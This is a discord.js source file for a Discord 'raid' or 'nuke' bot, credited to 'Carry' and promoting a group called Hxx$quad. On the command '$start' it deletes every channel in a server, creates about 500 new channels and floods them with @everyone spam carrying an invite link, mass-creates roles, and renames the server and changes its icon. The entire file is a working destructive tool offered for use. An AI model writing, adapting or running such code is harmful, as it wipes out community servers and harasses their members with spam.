const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');
 
client.on("ready", () => {
 
  console.log(chalk.green("Iniciando bot raid."));
  console.log(chalk.green("Iniciando bot raid.."));
  console.log(chalk.green("Iniciando bot raid..."));
  console.log(chalk.green("#Hxx$quad "));
                                                      

console.log("                          ");  
console.log("   ")
  console.log(chalk.green(`[Cliente ${client.user.tag} listo para el raid!]`));  
  console.log(chalk.greenBright("[Bot creado por Carry]"));   
  console.log("      ") 
  console.log("      ")
  console.log("      ")
  console.log("      ")
  console.log("      ")
  console.log(chalk.green(`[$] Comando para el raid: 
[$] $start 
[$] 
[*] #Hxx$quad
[*] https://discord.gg/hxxsquad`))
 
console.log("      ")
  
 
 
   presencia();  
    });
 
function presencia(){
  client.user.setPresence({
status: "online",
activity: {
  name: "#Hxx$quad  -  .gg/hxxsquad",
  type: "PLAYING"
 
}
  });
}
 
client.on("message", message => {
  if(message.author.bot) return;
 
  if(message.content === '$start') {
    message.delete()
    console.log("[$]", console.log("SERVER NUKEADO"));
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`pwnedbyhxxsquad`, {
      type: 'text'
    }).then(channel => {
      channel.send("@everyone - ESTE SERVER FUE DESTRUIDO POR HXX$QUAD  -  https://discord.gg/mJYAfSczPp")
 
    })
  }
})
 
 
 
client.on("message", message => {
  if(message.author.bot) return;
 
  if(message.content === '$start') {
    message.delete()
    console.log("[$]", console.log("INICIANDO RAIDEO"));
    for(let i = 0; i <= 500; i++) {
      message.guild.channels.create(`pwnedbyhxxsquad`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");
        channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp");

               })
       }
       message.guild.setName("PwnedByHxx$quad");
       message.guild.setIcon("https://cdn.discordapp.com/attachments/853615527212875816/854781465366495252/hxxmanda-2-3.png");
     }
})
        

 
client.on("message", message => {
if(message.author.bot) return;
 
if(message.content === '$start') {
  message.delete()
  console.log("[$]", console.log("SPAM EXITOSO"));
  for(let i = 0; i <= 500; i++) {
  message.channel.send("@everyone **Hxx$quad Is Here** - https://discord.gg/mJYAfSczPp")
}
}
})
 
 
client.on("message", message => {
  if(message.author.bot) return;
 
  if(message.content === '$start') {
    message.delete()
    console.log("[$]", console.log("ROLES CREADOS"));
    for(let i = 0; i <= 500; i++) {
      message.guild.roles.create({data: {name: `#Hxx$quad`,color: 'RED'},reason: 'por'})
      message.guild.roles.create({data: {name: `#Hxx$quad`,color: 'BLACK'},reason: 'geis'})
    }
  }
})
 
client.login("TOKEN");
